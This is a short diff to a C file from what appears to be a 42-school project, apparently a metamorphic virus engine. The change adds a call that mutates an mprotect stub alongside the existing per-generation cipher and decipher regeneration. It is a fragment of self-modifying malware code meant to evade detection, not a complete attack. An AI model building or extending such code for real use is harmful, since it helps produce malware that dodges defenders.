@@ -6,7 +6,7 @@
 /*   By: anselme <anselme@student.42.fr>            +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2019/12/11 01:29:20 by anselme           #+#    #+#             */
-/*   Updated: 2019/12/13 21:51:22 by anselme          ###   ########.fr       */
+/*   Updated: 2019/12/16 23:34:28 by nhaquet          ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -36,10 +36,12 @@
 bool		metamorph_self(uint64_t seed[2], uint64_t son_seed[2])
 {
 	size_t cypher_size = (size_t)cypher_end - (size_t)cypher;
+	size_t mprotect_size = (size_t)mprotect_end - (size_t)mprotect_call;
 
 	if (!yield_seed_to_heir(seed, son_seed)
 	|| !generate_cypher((void *)cypher, son_seed[0], cypher_size)
 	|| !generate_decypher((void *)decypher, son_seed[0], cypher_size)
+	|| !generate_mprotect((void *)mprotect_call, son_seed[0], mprotect_size)
 	|| !true) // add more metamorphosis above!
 		return errors(ERR_THROW, 'm', '1');
 	return true;
